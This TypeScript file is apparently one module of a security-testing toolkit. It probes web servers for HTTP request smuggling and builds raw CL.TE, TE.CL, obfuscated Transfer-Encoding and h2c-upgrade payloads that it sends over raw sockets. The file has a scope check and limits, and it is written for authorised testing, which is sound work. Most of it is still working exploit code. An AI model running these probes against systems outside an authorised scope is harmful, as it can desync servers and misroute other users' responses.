// smuggleProbe.ts — HTTP request smuggling prover (CL.TE / TE.CL / TE-obfuscation).
//
// Two-hop desync primitive over a RAW socket (proxies/CDN rewrite what fetch
// would send, so undici/fetch cannot emit the ambiguous CL+TE bytes): conn A
// sends a probe whose body hides a COMPLETE second request (GET /<canary>),
// conn B (same socket, right after) sends a normal victim request. A back-end
// that parses the body differently from the front-end answers the hidden
// canary as if it were the victim's response — response misattribution.
// Classification is honest and count-based (pure `classifySmuggle`):
//   canary answered + <=2 responses = CONFIRMED (the front only saw 2
//     requests, yet a canary response arrived — a hop parsed hidden bytes);
//   canary answered + >=3 responses = SIGNAL (consistent pipelining also does
//     this — needs a real front/back pair to discriminate);
//   no canary + 400/501 = REJECTED (strict parser — safe from this vector);
//   no canary + normal responses = NO-DESYNC;
//   no response at all = SIGNAL (possible backend stall, repeat manually).
// Sinyal != vuln: CONFIRMED -> poc_verify -> finding_add (CWE-444).
// Scope-gated, bounded (<=3 modes, ~4s read each), write — confirm.

import { targetAllowed, politeDelay } from "./security";

export type SmuggleMode = "clte" | "tecl" | "teob" | "h2c";

export interface SmuggleTarget {
  host: string;
  port: number;
  tls: boolean;
  path: string;
}

function rand36(n = 6): string {
  return Math.random().toString(36).slice(2, 2 + n).padEnd(n, "0");
}

/** Parse an http(s) URL into raw-socket dial info. Pure — null on reject. */
export function parseSmuggleTarget(raw: string): SmuggleTarget | null {
  try {
    const u = new URL(String(raw || "").trim());
    if (!/^https?:$/i.test(u.protocol)) return null;
    if (!u.hostname) return null;
    const tls = /^https:$/i.test(u.protocol);
    const port = u.port ? Number(u.port) : tls ? 443 : 80;
    if (!Number.isFinite(port) || port < 1 || port > 65535) return null;
    return { host: u.hostname, port, tls, path: `${u.pathname || "/"}${u.search || ""}` };
  } catch {
    return null;
  }
}

/** TE header obfuscations: naive fronts miss TE (fall back to CL) while a
 *  lenient back-end still honours chunked — the CL.TE shape via spelling.
 *  Pure data — tested. */
export function obfuscations(): string[] {
  return [
    "Transfer-Encoding: \tchunked",
    'Transfer-Encoding: "chunked"',
    "Transfer-Encoding: chunked, cow",
  ];
}

/**
 * Build the raw probe bytes for one mode. The hidden request is a COMPLETE
 * `GET /<canary>` (ends \r\n\r\n) so a TE-parsing hop answers it on the spot.
 * Pure — unit-tested.
 */
export function buildProbe(
  mode: SmuggleMode,
  host: string,
  path: string,
  canary: string,
  teVariant = 0
): string {
  if (mode === "h2c") {
    // h2c downgrade (CWE-444 family): ask the EDGE to upgrade the back-end hop
    // to h2c. If the edge forwards Upgrade/h2c and keeps speaking HTTP/1.1 to
    // the client, later requests can be misattributed into the h2c stream.
    // No hidden request here — the canary rides the VICTIM request instead.
    return (
      `GET ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
      `Connection: Upgrade, HTTP2-Settings\r\n` +
      `Upgrade: h2c\r\n` +
      `HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n` +
      `\r\n`
    );
  }
  const hidden = `GET /${canary} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`;
  if (mode === "tecl") {
    // Front uses TE (one request: chunk + terminator), back uses CL and stops
    // after the chunk-size line, leaving the hidden request as its next one.
    const hex = Buffer.byteLength(hidden, "utf8").toString(16);
    const hexLine = `${hex}\r\n`;
    const body = `${hexLine}${hidden}\r\n0\r\n\r\n`;
    return (
      `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
      `Content-Length: ${Buffer.byteLength(hexLine, "utf8")}\r\n` +
      `Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n${body}`
    );
  }
  // clte + teob share the shape: CL covers the 0-chunk AND the hidden
  // request; a TE hop stops at the 0-chunk and queues the hidden one.
  const body = `0\r\n\r\n${hidden}`;
  const obs = obfuscations();
  const teLine =
    mode === "teob"
      ? (obs[teVariant] ?? obs[0] ?? "Transfer-Encoding: chunked")
      : "Transfer-Encoding: chunked";
  return (
    `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
    `Content-Length: ${Buffer.byteLength(body, "utf8")}\r\n` +
    `${teLine}\r\nConnection: keep-alive\r\n\r\n${body}`
  );
}

/** The normal follow-up request on the same socket. Pure — unit-tested. */
export function buildVictim(host: string, victim: string): string {
  return `GET /${victim} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`;
}

export type SmuggleVerdict = "CONFIRMED" | "SIGNAL" | "NO-DESYNC" | "REJECTED";

/**
 * Count-based verdict over the raw bytes read back. Pure — unit-tested.
 * `canary` is the bare canary path segment (no leading slash).
 */
export function classifySmuggle(
  out: string,
  canary: string
): { verdict: SmuggleVerdict; reason: string } {
  const text = out || "";
  // NOTE: responses arrive back-to-back on the wire (body bytes are directly
  // followed by the next status line — no newline), so count occurrences
  // anywhere, not just at line starts.
  const statuses = text.match(/HTTP\/1\.[01] \d{3}/g) || [];
  const canarySeen = canary ? text.includes(canary) : false;
  const firstLine = statuses.length ? (statuses[0] ?? "") : "";
  const first = firstLine ? Number((/HTTP\/1\.[01] (\d{3})/.exec(firstLine) || [])[1] || 0) : 0;
  // h2c acceptance markers (used by the h2c mode): the edge/back-end accepted
  // the h2c upgrade — tunneling surface, worth a SIGNAL even without canary.
  // Anchored to the FIRST status line (101) or an HTTP/2 preface, so a plain
  // body containing the number 101 can never fake it.
  if (first === 101 || /PRI \* HTTP\/2\.0/.test(text) || /^HTTP\/2 /.test(text)) {
    return {
      verdict: "SIGNAL",
      reason: "h2c upgrade DITERIMA (101/HTTP/2 frame) — kandidat h2c smuggling (CWE-444): uji manual pasangan front/back sebelum lapor.",
    };
  }
  if (canarySeen && statuses.length <= 2) {
    return {
      verdict: "CONFIRMED",
      reason: `canary /${canary} terjawab dalam ${statuses.length} respons — hop belakang mem-parse byte tersembunyi sebagai request terpisah (misattribution).`,
    };
  }
  if (canarySeen) {
    return {
      verdict: "SIGNAL",
      reason: `canary terjawab tapi ada ${statuses.length} respons — konsisten juga dengan pipelining normal; butuh pasangan front/back asli untuk memastikan.`,
    };
  }
  if (first === 400 || first === 501) {
    return {
      verdict: "REJECTED",
      reason: `server menolak request CL+TE (${first}) — parser tegas, tidak rentan teknik ini.`,
    };
  }
  if (!statuses.length) {
    return {
      verdict: "SIGNAL",
      reason: "tidak ada respons (timeout/putus) setelah probe — mungkin back-end menunggu byte; ulangi manual sebelum menyimpulkan.",
    };
  }
  return {
    verdict: "NO-DESYNC",
    reason: `${statuses.length} respons normal, canary tak terjawab — tidak ada desync pada vektor ini.`,
  };
}

const READ_BUDGET_MS = 4_000;
const MAX_OUT_BYTES = 200_000;

/** One probe + victim exchange on a single raw socket. Bounded by timer. */
export async function probeOnce(
  t: SmuggleTarget,
  mode: SmuggleMode,
  canary: string,
  victim: string,
  teVariant = 0
): Promise<string> {
  const probe = buildProbe(mode, t.host, t.path, canary, teVariant);
  const vic = buildVictim(t.host, victim);
  const mod = t.tls ? await import("node:tls") : await import("node:net");
  return new Promise((resolve) => {
    let out = "";
    let settled = false;
    // TLSSocket extends net.Socket, so one union type covers both dial paths.
    let sock: import("node:net").Socket | null = null;
    const finish = () => {
      if (settled) return;
      settled = true;
      try {
        clearTimeout(timer);
      } catch {
        /* ignore */
      }
      try {
        sock?.destroy();
      } catch {
        /* ignore */
      }
      resolve(out);
    };
    const timer = setTimeout(finish, READ_BUDGET_MS);
    const onData = (d: Buffer) => {
      out += d.toString("latin1");
      if (out.length > MAX_OUT_BYTES) finish();
    };
    const start = (s: import("node:net").Socket) => {
      try {
        s.write(probe);
        setTimeout(() => {
          try {
            if (!settled) s.write(vic);
          } catch {
            /* ignore */
          }
        }, 120);
      } catch {
        finish();
      }
    };
    const hook = () => {
      const s = sock;
      if (!s) {
        finish();
        return;
      }
      s.on("data", onData);
      s.on("close", finish);
      s.on("error", () => {
        /* error usually precedes close; the timer still bounds us */
      });
      s.on("timeout", finish);
      try {
        s.setTimeout(READ_BUDGET_MS);
      } catch {
        /* ignore */
      }
      start(s);
    };
    try {
      if (t.tls) {
        const tlsMod = mod as typeof import("node:tls");
        sock = tlsMod.connect(
          { host: t.host, port: t.port, rejectUnauthorized: false },
          hook
        );
        sock.on("error", () => {
          /* bounded by timer/close */
        });
      } else {
        const netMod = mod as typeof import("node:net");
        sock = netMod.connect({ host: t.host, port: t.port }, hook);
        sock.on("error", () => {
          /* bounded by timer/close */
        });
      }
    } catch {
      finish();
    }
  });
}

/**
 * Run the desync matrix against a target. Scope-gated, bounded.
 * `modes`: comma list subset of clte,tecl,teob (default all three).
 */
export async function smuggleProbe(
  rawUser: unknown,
  opts: { url?: string; modes?: string; te?: number } = {}
): Promise<string> {
  void rawUser;
  const raw = String(opts.url || "").trim();
  if (!/^https?:\/\//i.test(raw)) return "Error: url harus http(s).";
  if (!targetAllowed(raw))
    return "Error: SCOPE — smuggle_probe hanya untuk lab / engagement aktif.";
  const t = parseSmuggleTarget(raw);
  if (!t) return "Error: URL tidak valid.";
  const want = String(opts.modes || "clte,tecl,teob,h2c")
    .split(",")
    .map((s) => s.trim().toLowerCase())
    .filter((s): s is SmuggleMode => s === "clte" || s === "tecl" || s === "teob" || s === "h2c")
    .slice(0, 4);
  const modes: SmuggleMode[] = want.length ? want : ["clte", "tecl", "teob", "h2c"];
  const teVariant = Math.max(
    0,
    Math.min(obfuscations().length - 1, Number(opts.te ?? 0) || 0)
  );
  const canary = `mia-smuggle-${rand36()}`;
  const victim = `mia-victim-${rand36()}`;
  const lines: string[] = [
    `⛓️ SMUGGLE PROBE ${raw} — ${modes.join("/")} (canary /${canary}).`,
  ];
  let confirmed = 0;
  for (const mode of modes) {
    await politeDelay();
    let out = "";
    try {
      out = await probeOnce(t, mode, canary, victim, teVariant);
    } catch (e) {
      lines.push(`• [${mode}] transport gagal: ${e instanceof Error ? e.message : String(e)}`);
      continue;
    }
    const c = classifySmuggle(out, canary);
    if (c.verdict === "CONFIRMED") confirmed++;
    if (mode === "h2c" && /h2c upgrade DITERIMA/.test(c.reason)) lines.push("  ⚠️ h2c: edge meneruskan Upgrade — kirim request berikutnya di koneksi yang sama; kalau dijawab HTTP/2 frame → tunneling terbuka.");
    const mark =
      c.verdict === "CONFIRMED" ? "✅" : c.verdict === "REJECTED" ? "🛡️" : c.verdict === "SIGNAL" ? "⚠️" : "➖";
    lines.push(`• [${mode}] ${mark} ${c.verdict} — ${c.reason}`);
  }
  lines.push(
    confirmed > 0
      ? `Verdict: DESYNC TERKONFIRMASI (${confirmed}/${modes.length} vektor) — replay pola respons via poc_verify lalu finding_add (CWE-444, request smuggling).`
      : "Verdict: tidak terkonfirmasi — JANGAN finding_add dari probe ini; smuggling butuh pasangan front/back nyata, satu hop konsisten bukan temuan."
  );
  return lines.join("\n");
}
